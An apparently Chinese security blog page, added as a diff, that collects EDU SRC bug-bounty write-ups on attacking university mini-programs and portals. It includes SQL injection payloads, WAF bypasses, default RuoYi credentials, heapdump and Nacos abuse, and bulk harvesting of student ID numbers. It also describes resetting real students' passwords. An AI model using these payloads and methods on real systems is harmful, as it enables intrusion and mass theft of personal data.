@@ -1,0 +1,565 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>漏洞挖掘场景 | ZQ-Rookie-Hacker&#39;s Blog</title>
+  <meta name="author" content="ZQ-Rookie-Hacker">
+  
+  <meta name="description" content="0x01 小程序接口 type 参数 SQL 时间盲注——if(1=1,sleep(2),1) 延时注入现有一个场景：点击小程序，把功能点都点一遍，发现有一个数据包长这样：
+POST /guolian/wxmini/wx_information/wx_contact/getContactList H">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="漏洞挖掘场景"/>
+  <meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"><script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    processEscapes: true,
+    processEnvironments: true
+  },
+  options: {
+    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  startup: {
+    pageReady: () => {
+      return MathJax.startup.defaultPageReady();
+    }
+  }
+};
+</script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ZQ-Rookie-Hacker&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 漏洞挖掘场景</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h2 id="0x01-小程序接口-type-参数-SQL-时间盲注——if-1-1-sleep-2-1-延时注入"><a href="#0x01-小程序接口-type-参数-SQL-时间盲注——if-1-1-sleep-2-1-延时注入" class="headerlink" title="0x01 小程序接口 type 参数 SQL 时间盲注——if(1=1,sleep(2),1) 延时注入"></a>0x01 小程序接口 <code>type</code> 参数 SQL 时间盲注——<code>if(1=1,sleep(2),1)</code> 延时注入</h2><p>现有一个场景：点击小程序，把功能点都点一遍，发现有一个数据包长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /guolian/wxmini/wx_information/wx_contact/getContactList HTTP/2</span><br><span class="line">Host: xxxx</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">type=1</span><br></pre></td></tr></table></figure>
+
+<p>很明显可以尝试 <code>type</code> 参数是否存在 SQL 注入漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type=if(1=1, sleep(2), 1)</span><br></pre></td></tr></table></figure>
+
+<p>成功延迟。总结一下，这就是一个 edu 小程序获取学校通知内容的数据包，还是要老老实实每个功能抓包查看啊。</p>
+<hr>
+<h2 id="0x02-小程序-AES-加密-id-参数越权——逆向反编译-批量遍历拿下十万用户敏感信息"><a href="#0x02-小程序-AES-加密-id-参数越权——逆向反编译-批量遍历拿下十万用户敏感信息" class="headerlink" title="0x02 小程序 AES 加密 id 参数越权——逆向反编译 + 批量遍历拿下十万用户敏感信息"></a>0x02 小程序 AES 加密 <code>id</code> 参数越权——逆向反编译 + 批量遍历拿下十万用户敏感信息</h2><p>在平台更新新资产后，对目标站点进行常规打点探测，过程中发现关联的小程序入口。初步浏览小程序仅看到名片展示功能，看似无高价值测试点，但在抓包分析接口数据包时，意外发现接口会返回其他用户的个人邮箱和手机号等敏感信息，同时注意到请求参数中存在一个疑似用户标识的 <code>id</code> 参数，由此初步判断存在越权漏洞风险。</p>
+<p>随后尝试对该 <code>id</code> 参数进行常规 Base64 解密，结果解密内容无规律且无效，结合参数特征和经验进一步判断该 <code>id</code> 采用了 AES 加密方式。为获取加密密钥，直接对目标小程序进行反编译操作，拿到小程序源码后，通过搜索 “AES” 关键字定位到加密相关代码片段，从中提取出 AES 加密所需的 key、iv 向量、加密模式（CBC）及填充方式（Pkcs7）等核心信息，利用这些信息成功将加密的 <code>id</code> 参数解密为纯数字格式的原始用户 id。</p>
+<p>接着编写自动化脚本，批量生成连续的原始用户 id，再用获取到的 AES 密钥将每个原始 id 加密为接口可识别的格式，批量发送接口请求进行遍历探测，最终成功获取到约 10 万条用户名片信息，包含手机号、邮箱等敏感数据。最后整理漏洞细节提交报告，厂商确认该漏洞为高危越权漏洞并完成修复。</p>
+<hr>
+<h2 id="0x03-Oracle-报错注入-WAF-绕过——垃圾数据-注释干扰-手工脚本突破"><a href="#0x03-Oracle-报错注入-WAF-绕过——垃圾数据-注释干扰-手工脚本突破" class="headerlink" title="0x03 Oracle 报错注入 WAF 绕过——垃圾数据 /**/ 注释干扰 + 手工脚本突破"></a>0x03 Oracle 报错注入 WAF 绕过——垃圾数据 <code>/**/</code> 注释干扰 + 手工脚本突破</h2><p>处于未进入目标教育网站后台、准备开展漏洞探测的场景。思路是先拿到合法登录权限，才能访问内部接口并排查潜在漏洞。进行账号密码登录并抓取系统内接口请求数据包后，定位到 <code>queryActivityList.do</code> 可疑接口，重点核查接口参数是否直接拼接 SQL 语句，以此判断是否存在注入风险。</p>
+<p>解析数据包后发现 <code>sortField</code> 参数会直接插入 SQL 语句的 <code>ORDER BY</code> 子句，可利用 Oracle 报错注入获取数据。但注入行为会被 WAF 拦截，且 <code>ORDER BY</code> 后参数长度受限。</p>
+<p>核心绕过手法：在真实 SQL 注入语句前后，塞入超大量用 <code>/**/</code> 注释符包裹的无用字符，这些被注释的垃圾数据会被数据库忽略，不影响注入语句执行，还能干扰 WAF 特征检测、避开 <code>ORDER BY</code> 后的长度限制，成功突破防护。</p>
+<p>随后自动化注入工具 SQLMap 无法识别该漏洞，放弃工具依赖，自行编写 Python 脚本开展手动注入测试。逐步探测数据库结构后发现目标数据库存在一千多张数据表，且表名为汉字拼音首字母缩写，无法直观识别表内容。结合网站业务背景经验，人工推测表含义并逐个开展注入查询，排除空表后成功读取到有效业务数据。最后展示注入数据作为漏洞证明，向站点提出参数过滤、预编译查询等针对性安全优化建议。</p>
+<hr>
+<h2 id="0x04-水电费小程序未授权访问——若依（RuoYi）框架固定路径利用"><a href="#0x04-水电费小程序未授权访问——若依（RuoYi）框架固定路径利用" class="headerlink" title="0x04 水电费小程序未授权访问——若依（RuoYi）框架固定路径利用"></a>0x04 水电费小程序未授权访问——若依（RuoYi）框架固定路径利用</h2><p>进入目标大学宿舍电费微信小程序，随意绑定一个房间并开启代理抓取所有请求数据包。将核心请求包放入 Repeater 模块，手动修改接口路径为 <code>/prod-api/system/user/list</code> 并发送请求，成功访问用户列表接口，发现普通用户信息泄露。</p>
+<p>继续修改接口路径为 <code>/prod-api/system/config/list</code>、<code>/prod-api/system/user/1</code> 并分别发送请求，探测到配置接口泄露管理员初始密码、用户详情接口泄露加密密码，确认接口存在严重未授权访问漏洞。</p>
+<blockquote>
+<p>国内最常用的若依（RuoYi）框架，这套框架有固定死的后台接口地址，所有人都能用，不用瞎猜：</p>
+<ul>
+<li>用户列表：<code>/system/user/list</code></li>
+<li>系统配置：<code>/system/config/list</code></li>
+<li>部门列表：<code>/system/dept/list</code></li>
+</ul>
+<p>你只需要把抓到的任意接口前缀（如 <code>/prod-api/</code>）保留，后面直接套这些通用地址就能测试。所谓的 “经验”，只是知道「大学 &#x2F; 企业后台最爱用若依框架」，知道这些固定地址而已，不是凭空乱改。</p>
+</blockquote>
+<hr>
+<h2 id="0x05-Spring-Boot-敏感端点探测——-env-与-heapdump-信息泄露利用"><a href="#0x05-Spring-Boot-敏感端点探测——-env-与-heapdump-信息泄露利用" class="headerlink" title="0x05 Spring Boot 敏感端点探测——/env 与 /heapdump 信息泄露利用"></a>0x05 Spring Boot 敏感端点探测——<code>/env</code> 与 <code>/heapdump</code> 信息泄露利用</h2><p>在 eduSRC 教育类站点的漏洞挖掘过程中，以目标系统登录页面为起点，首先开展弱口令、SQL 注入等常规 Web 漏洞测试。未发现明显漏洞后，转而分析前端 JS 文件以寻找潜在接口，但其暴露的接口均会重定向至登录页面，无法直接未授权访问。</p>
+<p>随后通过页面图标特征识别出目标采用 Spring Boot 框架，便尝试使用 SpringBoot 专用工具批量探测该框架常见的 <code>/actuator</code> 系列敏感端点，然而工具未返回任何有效结果，推测工具特征被目标安全防护机制检测并拦截。</p>
+<p>在此情况下放弃工具扫描，转为手工试探 Spring Boot 典型敏感路径：</p>
+<ul>
+<li>直接拼接访问 <code>/env</code> 端点，成功获取环境变量、内网地址等敏感信息</li>
+<li>结合经验判断存在 <code>/env</code> 端点通常会伴随 <code>/heapdump</code> 堆转储文件，进而访问并下载</li>
+<li>使用 JDumpSpider 工具对 <code>heapdump</code> 文件进行解密分析，最终提取出内网明文密码等高价值敏感数据</li>
+</ul>
+<p>整个过程充分体现了 SRC 漏洞挖掘的核心思路：常规测试无果后需精准识别技术栈、灵活切换工具探测与手工测试模式；针对 Spring Boot 这类特定框架，在工具被防护时手工探测其特有敏感路径是突破关键；同时对泄露的 <code>heapdump</code> 等文件进行深度解析，能进一步挖掘出可直接利用的敏感信息，大幅提升漏洞挖掘的成功率与价值。</p>
+<hr>
+<h2 id="0x06-Nacos-未授权访问——配置泄露链式利用与第三方付费服务滥用"><a href="#0x06-Nacos-未授权访问——配置泄露链式利用与第三方付费服务滥用" class="headerlink" title="0x06 Nacos 未授权访问——配置泄露链式利用与第三方付费服务滥用"></a>0x06 Nacos 未授权访问——配置泄露链式利用与第三方付费服务滥用</h2><p>EDUSRC 漏洞挖掘以目标系统登录框为初始入口，先通过目录扫描工具对目标站点进行路径探测，成功发现暴露在外的 Nacos 服务接口。</p>
+<p>随后借助 Nacos 相关 Nday 漏洞利用方式，直接访问 Nacos 用户列表接口获取用户数据，再使用专用工具对 Nacos 服务进行批量探测，确认目标存在 Nacos 未授权访问等高危漏洞。</p>
+<p>为验证漏洞危害，先构造请求 Payload 执行未授权用户删除操作，确认可任意操作用户账号，还可进行未授权添加用户等类似操作。</p>
+<p>进一步挖掘发现该 Nacos 服务支持未授权导出全部配置信息，导出的配置文件中大量泄露 MongoDB 数据库账户密码与地址、即时通信 IM 服务地址及账号密码、Redis 缓存单机及集群的密码、邮箱账号密码以及各类第三方服务密钥等核心敏感数据。</p>
+<p>最后从泄露信息中定位到百度人脸识别服务的 APIKey 与 SecretKey，结合官方文档编写 Python 脚本调用该付费接口，验证漏洞可导致第三方付费资源被恶意滥用，以此完整证明该 Nacos 未授权漏洞从基础越权操作到核心数据泄露、再到高价值第三方资源滥用的全链条严重危害。</p>
+<p>整体挖掘思路遵循从基础入口探测到敏感组件发现、从漏洞初步验证到深层数据提取、再到高危害场景落地利用的递进逻辑，逐步放大漏洞影响范围与危害等级。</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/428863.html">Nacos漏洞汇总复现</a></p>
+<hr>
+<h2 id="0x07-微信小程序全链路漏洞挖掘——框架识别驱动专项突破与敏感数据批量遍历"><a href="#0x07-微信小程序全链路漏洞挖掘——框架识别驱动专项突破与敏感数据批量遍历" class="headerlink" title="0x07 微信小程序全链路漏洞挖掘——框架识别驱动专项突破与敏感数据批量遍历"></a>0x07 微信小程序全链路漏洞挖掘——框架识别驱动专项突破与敏感数据批量遍历</h2><p>在教育机构（EDU）场景下挖掘微信小程序漏洞，核心是瞄准学校微信小程序这一优质目标——这类小程序无需对接复杂的校园统一认证系统、功能模块高度集中（多围绕学生信息、教务管理、证书查询、校园服务等核心场景），且开发团队为快速上线往往存在大量安全疏漏，是漏洞挖掘的高价值阵地。</p>
+<p>挖掘时首先通过微信搜索定位目标学校小程序，借助 Burp Suite 等工具抓取小程序与后端交互的所有请求流量，第一步先通过请求包路径、响应特征精准识别后端开发框架：</p>
+<ul>
+<li>若请求中出现 <code>/prod-api</code>、<code>/xxx-api</code> 前缀，可判定为若依（RuoYi）框架；</li>
+<li>若存在 <code>/jeecg-boot/</code>、<code>/xxxx-boot/</code> 路径，则为 Jeecg 框架；</li>
+<li><code>/api/sysxxxxxx</code> 类接口多对应 Admin.net 框架；</li>
+<li>SpringBoot 框架则可通过经典报错页面、<code>/heapdump</code> 敏感端点暴露或 <code>/swagger</code> 接口文档存在来识别。</li>
+</ul>
+<p>识别框架后随即开展针对性漏洞挖掘：</p>
+<p><strong>若依（RuoYi）框架：</strong> 优先尝试 <code>ruoyi/admin123</code>、<code>ry/admin123</code> 等默认弱口令，若登录成功则进入后台利用定时任务功能构造恶意命令实现 RCE；同时在前台流量中检测 Shiro 框架特征（如 <code>rememberMe</code> Cookie），用 Burp 的 Shiro 插件爆破默认密钥——密钥成功则构造恶意 Cookie 触发反序列化 RCE，密钥失败则放弃该点；此外还要探测 Druid 监控接口是否存在弱口令，尝试登录获取数据库连接信息与 SQL 执行记录。</p>
+<p><strong>Jeecg 框架：</strong> 先通过微信一键登录获取 JWT 令牌，用令牌批量遍历各类敏感接口；同时尝试 <code>Jeecg/123456</code> 弱口令登录后台，测试积木报表功能是否存在 SQL 注入；还可查找普通用户提权至管理员权限的接口，无需管理员权限也能通过 JWT 越权获取敏感数据。</p>
+<p><strong>Admin.net 框架：</strong> 直接抓取小程序接口请求，批量梭哈 <code>/api/sysxxxxxx</code> 类接口，尝试越权获取学生证书、隐私信息等敏感数据。</p>
+<p><strong>SpringBoot 框架：</strong> 重点检测 <code>/heapdump</code> 端点是否开放，若开放则用 JDumpSpider 工具提取数据库密码、云服务密钥等敏感信息；同时遍历 <code>/swagger</code> 接口文档，逐个测试接口未授权访问漏洞，避免误删类高危接口。</p>
+<p>完成框架专项挖掘后，再聚焦微信小程序特有漏洞场景深度挖掘：</p>
+<ul>
+<li>抓包分析微信一键登录流量，若发现 <code>sessionkey</code>、<code>iv</code>、加密数据泄露，可通过解密工具还原敏感信息，伪造目标用户手机号加密后发包，实现任意用户账号登录；</li>
+<li>检查接口请求参数，若 <code>id</code>、<code>openid</code>、<code>unionid</code>、<code>phone</code> 等参数可控，通过遍历 1-200 等数字区间，越权获取全校用户手机号、身份证、openid 等敏感信息，再利用部分小程序登录逻辑仅校验这三个参数的漏洞，直接接管全站用户账号；</li>
+<li>测试头像上传、文件提交等功能，检查是否未校验文件类型与后缀，尝试上传恶意脚本获取服务器权限；</li>
+<li>分析验证码验证逻辑：若验证码手机号明文写在数据包中，可修改为自己手机号接收验证码绕过校验；若为四位纯数字验证码则直接爆破 1000-9999 区间；</li>
+<li>爆破 <code>13888888888</code> 等常见测试手机号，往往能发现开发遗留的测试账号，进一步扩大漏洞范围。</li>
+</ul>
+<p>最后遍历所有接口参数，修改 <code>id</code>、<code>phone</code> 等参数值，全面测试水平越权（访问同权限其他用户数据）与垂直越权（提升至管理员权限）。若能批量获取大量学生身份证、手机号等敏感数据，即可判定为高危漏洞。整套流程从框架识别、专项漏洞突破到小程序特有风险挖掘，形成完整的 EDU 场景微信小程序漏洞挖掘闭环。</p>
+<hr>
+<h2 id="0x08-教育系统组合拳——弱口令爆破-SQL-注入-WAF-绕过-接口越权通杀"><a href="#0x08-教育系统组合拳——弱口令爆破-SQL-注入-WAF-绕过-接口越权通杀" class="headerlink" title="0x08 教育系统组合拳——弱口令爆破 + SQL 注入 WAF 绕过 + 接口越权通杀"></a>0x08 教育系统组合拳——弱口令爆破 + SQL 注入 WAF 绕过 + 接口越权通杀</h2><p>在教育机构SRC漏洞挖掘场景中，整个过程从前期信息搜集开始：先通过谷歌语法精准搜索目标学校域名下的默认密码、系统操作手册等公开信息，这类信息对应的老旧系统往往存在默认密码未修改的情况；同时利用谷歌语法、QQ群、各类社交平台搜集在读学生的学号信息，也可根据官网规则自编学号，而学生密码大多与身份证信息相关，为缩小数据范围可选取稀有姓名在电报平台筛选。凭借这些信息尝试登录系统，成功后便进入后续漏洞测试环节。</p>
+<p>接着开展 XSS 漏洞测试，重点瞄准学校官网、二级学院网站中的投诉建议、留言反馈等存在输入框的功能点——只要有输入位置就插入测试字符，这类公开交互点大概率存在 XSS 漏洞，可作为基础漏洞提交获取分数。</p>
+<p>随后聚焦 SQL 注入漏洞挖掘。第一个场景是学校教务一体化系统：先从贴吧等平台获取系统账号格式，再通过社群了解到默认密码规则为 <code>账号+!qwer</code>，据此构造弱口令字典进行爆破；成功登录后进入教室借用申请功能，前端直接输入测试字符无异常反应，于是抓包修改请求体数据，发现输入单引号后系统报错，再通过构造 <code>1=1</code> 返回数据、<code>1=2</code> 无数据的测试语句，确认存在 SQL 注入。针对 Oracle 数据库环境，使用 <code>1&#39;and 1=(case when ASCII(SUBSTRC(USER,1,1))=1 then 1 else 5 end) or &#39;1&#39;=&#39;2&#39;</code> 这类 payload 逐位爆破出当前数据库用户信息，同时发现该教务系统为多校通用平台，不同学校仅界面不同、接口逻辑完全一致，可实现漏洞通杀。</p>
+<p>第二个场景是学校缴费平台的详情功能点：抓包后发现输入单引号系统报错、输入双引号则恢复正常，起初尝试参数污染、高并发请求、分段传输等多种 WAF 绕过手段均未成功；耗费大量时间后发现特殊逻辑——构造 <code>1 in 1</code> 请求会返回海量数据导致回显延迟，构造 <code>1 in 5</code> 请求则返回空数据。利用该特性先爆破出数据库用户名长度为 7 位，再通过 <code>&#39;OR+1+in+instr(user,&#39;u&#39;)+and+&#39;a&#39;+in+&#39;a</code> 这类借助 <code>instr</code> 函数的 payload，逐位确认用户名的每一个字符，最终完成注入利用。</p>
+<p>最后开展越权漏洞测试：在系统公告模块仅拥有普通查询权限、无删除新增权限，于是抓取搜索功能的请求包，分析接口命名规律，构造包含 <code>delete</code>、<code>del</code> 等关键词的接口路径字典，复用原有请求的完整数据发送测试，最终成功触发数据删除操作；同理也可通过构造对应接口测试越权新增等高危操作，完成整个教育机构系统的 SRC 漏洞挖掘流程。</p>
+<hr>
+<h2 id="0x09-新证书站抢时间挖洞——heapdump-泄露教师信息-→-默认密码横向突破-→-学生管理系统越权遍历"><a href="#0x09-新证书站抢时间挖洞——heapdump-泄露教师信息-→-默认密码横向突破-→-学生管理系统越权遍历" class="headerlink" title="0x09 新证书站抢时间挖洞——heapdump 泄露教师信息 → 默认密码横向突破 → 学生管理系统越权遍历"></a>0x09 新证书站抢时间挖洞——heapdump 泄露教师信息 → 默认密码横向突破 → 学生管理系统越权遍历</h2><p>在 EDU SRC 平台上新证书站的漏洞挖掘场景中，由于证书上新后竞争极为激烈，漏洞容易被快速提交导致重复，因此挖掘核心思路是抢时间、重信息收集、从高风险通用漏洞入手逐步深入业务功能测试，具体过程如下：</p>
+<p>当收到 EDU SRC 新证书站上线通知后，第一时间启动漏洞挖掘工作，先通过各类信息收集工具批量搜集目标院校相关域名与站点资产，摒弃耗时的师生信息登录测试，直接将整理好的域名分批导入目录扫描工具进行主动探测，同时手动浏览各站点初步了解业务形态。</p>
+<p>扫描过程中重点关注到 Spring Boot 框架特有的 <code>/actuator</code> 接口可直接访问，确认存在 Spring Boot 未授权访问漏洞，进一步探测发现该接口下的 <code>heapdump</code> 文件可直接下载，随即使用专用工具分析该堆内存文件，提取出大量教师敏感信息，第一时间将该未授权访问漏洞提交至 EDU SRC 平台并获得中危评级。</p>
+<p>后续深入测试时，先利用前期泄露的教师信息定位到学校统一身份认证系统，发现该系统明确标注默认密码为身份证号后六位，尝试使用已获取的教师身份信息成功登录三个教师账户，且登录后可无二次认证直接跳转到其他校内系统，测试后发现其中一个账户具备学生管理系统访问权限。</p>
+<p>进入学生管理系统后切换至管理模式，对所有功能点进行抓包测试，在 “师生查询” 接口处发现存在敏感信息泄露问题，通过分析请求参数含义：</p>
+<ul>
+<li>修改 <code>pageSize</code> 参数扩大数据返回量</li>
+<li>将 <code>inStudentStatusSign</code> 参数设为 <code>false</code> 获取所有状态学生信息</li>
+<li>置空 <code>nj</code> 参数遍历所有年级数据</li>
+</ul>
+<p>成功批量获取大量学生信息，后续还发现教师权限可直接导出全量学生数据。</p>
+<p>为扩大挖掘范围，通过 Google 搜索语法查找该校其他存在默认口令的站点，利用已泄露的信息尝试登录校内邮箱等多个系统，虽多数系统强制登录后修改密码导致无有效信息泄露，但仍积累了更多可用信息。</p>
+<p>随后再次回到学生管理系统，在登录页面发现 “忘记密码” 功能仅需账号、姓名和身份证号即可重置密码，利用此前获取的学生信息成功修改多个学生账号密码，登录学生账号后继续对个人信息等功能点抓包，发现学生个人信息查询接口路径直接使用学号作为参数，尝试替换学号后成功遍历获取所有学生的个人敏感信息。</p>
+<p>经全面测试，学生账号下有 7 处、教师账号下有 2 处功能点存在类似遍历漏洞。</p>
+<p>最后在权限测试环节，意识到系统权限控制存在缺陷，使用普通学生账号登录并抓包，将请求接口路径替换为教师权限对应的接口路径，成功绕过权限校验实现垂直越权，最终将所有发现的未授权访问、敏感信息泄露、任意文件下载、信息遍历、垂直越权等漏洞批量提交至 EDU SRC 平台。</p>
+<p>整个挖掘过程充分体现了 “快速信息收集 → 优先挖掘高风险通用漏洞 → 利用泄露信息横向拓展 → 深入业务功能测试参数与权限 → 批量提交漏洞” 的核心思路，同时也凸显了在 EDU SRC 挖掘中，挖掘速度、全面的信息收集能力以及细致的功能点测试是成功获取漏洞的关键。</p>
+<hr>
+<h2 id="0x0A-一站式门户-IDOR-越权——userid-明文参数遍历-教师信息批量泄露"><a href="#0x0A-一站式门户-IDOR-越权——userid-明文参数遍历-教师信息批量泄露" class="headerlink" title="0x0A 一站式门户 IDOR 越权——userid 明文参数遍历 + 教师信息批量泄露"></a>0x0A 一站式门户 IDOR 越权——<code>userid</code> 明文参数遍历 + 教师信息批量泄露</h2><p>测试人员以普通学生身份登录某学院一站式服务大厅门户系统后，并未立刻使用自动化扫描工具，而是先以正常用户视角开展首轮信息摸排：仔细观察个人信息区域直接展示的学号、院系、班级等信息的格式规律，统计左侧功能菜单包含的子系统数量与涉及的业务类型，分析 URL 路径结构判断系统采用前后端分离的门户框架与 API 设计风格，同时留意页面加载的 JS、CSS 等静态资源，预判这类集成多业务模块的 edu 门户为了实现跨系统数据共享，往往会在权限控制上出现边界模糊的问题，且功能模块越多攻击面越大，个人信息区域大概率存在信息过度暴露风险。</p>
+<p>完成初步观察后，测试人员开启 Burp Suite 代理进行流量监听，以正常操作的方式点击系统内各个功能模块，在 HTTP 历史记录中逐一梳理后台 API 的调用规律，重点关注带有 <code>getUserInfo</code> 等明显功能语义的接口路径，以及携带 <code>userid</code>、<code>studentid</code> 这类用户标识参数的请求，同时核对响应 JSON 数据与前端页面展示内容的差异。</p>
+<p>基于 edu 系统开发常为了便捷直接返回完整数据对象的共性特征，判断查询类接口极易返回前端不需要的敏感字段，且带 ID 参数的接口大概率存在权限校验缺失的问题。</p>
+<p>随后测试人员从捕获的接口中筛选出功能明确的用户信息查询接口进行深度分析，发现该接口采用 GET 请求方式，<code>userid</code> 参数以明文学号形式直接拼接在 URL 中，既无加密也无签名校验，进一步查看响应数据后发现接口返回了 <code>SFZJH</code> 字段且直接展示完整身份证号码，结合参数完全可控的特征，初步判定该接口可能未校验当前登录用户与查询目标的权限对应关系，存在水平越权漏洞。</p>
+<p>为验证猜想，测试人员按照已掌握的学号格式规律构造其他用户的 <code>userid</code> 参数，修改原请求参数后重放数据包，发现系统返回 200 成功状态码，且响应体中返回了目标用户的完整个人信息与身份证号，证实系统仅根据传入的 <code>userid</code> 参数直接查询数据库，完全没有校验当前登录用户是否有权查看该用户信息，典型的 IDOR 越权漏洞确认存在。</p>
+<p>在确认单点漏洞后，测试人员继续拓展信息收集范围，遍历系统其余业务模块，在在线课程与直播选课页面中意外发现，系统未经任何脱敏处理直接公开了全校 6000 余名教师的姓名、完整工号、所属院系等信息，且教师工号具备统一可预测的格式规律，这一信息泄露点恰好为已发现的越权接口提供了完整的批量目标 ID 列表，将单用户越权的危害直接放大为批量教师敏感数据泄露。</p>
+<p>整个挖掘过程始终围绕 edu 系统的开发共性展开，遵循 “页面信息摸排 → 流量接口分析 → 单点漏洞验证 → 信息收集扩危害” 的思路，没有依赖高深的攻击技术，而是通过细致的信息收集将越权漏洞与信息泄露点组合利用，最终实现从普通学生账号到数千名教师身份证信息泄露的完整攻击链路，也充分体现出 edu 系统中对象级权限控制缺失、敏感字段全量返回、业务页面信息过度暴露三类问题叠加后的严重安全风险。</p>
+<hr>
+<h2 id="0x0B-就业管理平台-SQL-注入——统计功能异常报错触发-Oracle-数据库-shell-获取"><a href="#0x0B-就业管理平台-SQL-注入——统计功能异常报错触发-Oracle-数据库-shell-获取" class="headerlink" title="0x0B 就业管理平台 SQL 注入——统计功能异常报错触发 + Oracle 数据库 shell 获取"></a>0x0B 就业管理平台 SQL 注入——统计功能异常报错触发 + Oracle 数据库 shell 获取</h2><p>测试人员以普通学生账号登录某大学学生就业综合管理服务平台后，首先进入个人中心页面开展初步的功能与数据摸排，仔细查看页面展示的 2025 届毕业生分院系统计数据，包括各院系总人数、男女比例、往届对接人数等多维度汇总信息，同时梳理左侧功能菜单涵盖的用人单位信息查询、招聘会报名预约、简历维护、通知管理等业务模块。</p>
+<p>结合就业系统统计查询需要灵活筛选条件、常通过动态拼接 SQL 语句实现的开发特点，预判数据统计类功能是 SQL 注入的高发区域，同时留意简历更新、信息查询、报表导出等涉及数据库交互的模块也可能存在输入验证缺失的问题。</p>
+<p>在逐步测试系统各功能模块的过程中，当操作到就业数据统计相关功能时，页面出现异常跳转并返回错误提示，测试人员敏锐判断该异常大概率由后台 SQL 语句执行失败引发，随即开启 Burp Suite 代理对该操作对应的 HTTP 请求进行抓包分析，确认这是一个携带多参数的 POST 请求，所有查询参数均放置在请求体中传输，随后结合参数的命名语义与功能用途逐一排查用户可控输入点，筛选出直接参与后台数据查询条件构造的参数，判断该参数未经过严格的输入过滤与预编译处理，存在被直接拼接进 SQL 语句的可能。</p>
+<p>在定位到可疑注入点后，测试人员使用 sqlmap 工具对该 POST 参数进行自动化注入检测与深度利用，最终成功获取到目标 Oracle 数据库的交互式 SQL shell，不仅可枚举到数据库内全部用户账号，包含系统内置用户与业务系统用户，还能直接执行自定义 SQL 查询语句，同时验证出当前数据库账号权限配置过高，为后续进一步获取全量业务敏感数据、深入内网渗透提供了基础条件。</p>
+<p>整个挖掘过程遵循 “功能场景预判 → 异常现象捕获 → 流量分析定位 → 工具验证利用” 的思路，充分利用了业务系统统计查询功能的开发特性与错误反馈的信息泄露线索，逐步完成从漏洞发现到深度利用的完整链路。</p>
+<hr>
+<h2 id="0x0C-微信生态证书站越权——UA-伪装绕过客户端限制-openid-响应伪造突破后台登录"><a href="#0x0C-微信生态证书站越权——UA-伪装绕过客户端限制-openid-响应伪造突破后台登录" class="headerlink" title="0x0C 微信生态证书站越权——UA 伪装绕过客户端限制 + openid 响应伪造突破后台登录"></a>0x0C 微信生态证书站越权——UA 伪装绕过客户端限制 + <code>openid</code> 响应伪造突破后台登录</h2><p>整个漏洞挖掘始于一次 edusrc 证书站的闲逛过程，测试者在浏览 edusrc 礼品区时被某证书站点吸引并启动测试。</p>
